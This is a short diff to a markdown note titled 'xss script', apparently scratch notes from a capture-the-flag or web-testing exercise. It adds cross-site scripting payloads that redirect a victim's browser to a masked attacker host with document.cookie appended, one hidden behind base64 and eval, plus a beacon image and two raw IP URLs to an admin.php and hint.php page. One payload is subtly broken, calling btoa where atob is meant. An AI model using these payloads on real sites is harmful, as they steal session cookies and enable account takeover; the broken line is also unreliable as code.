@@ -1,4 +1,13 @@
 ### xss script
-```html
-</span><img onload="window.location = 'http://x.x.x.x:x/' + document.cookie">
+```javascript
+'eval(atob(\'' + btoa('window.location=\'http://---.---.---.---:----/\' + document.cookie') + '\'))'
 ```
+
+```html
+yelo</span><img src="http://---.---.---.---:----/ping">
+yelo</span><img onerror="window.location = 'http://---.---.---.---:----/' + document.cookie">
+yelo</span><img onerror="eval(btoa(('...'))">
+```
+
+- http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php
+- http://139.199.107.193/hint.php
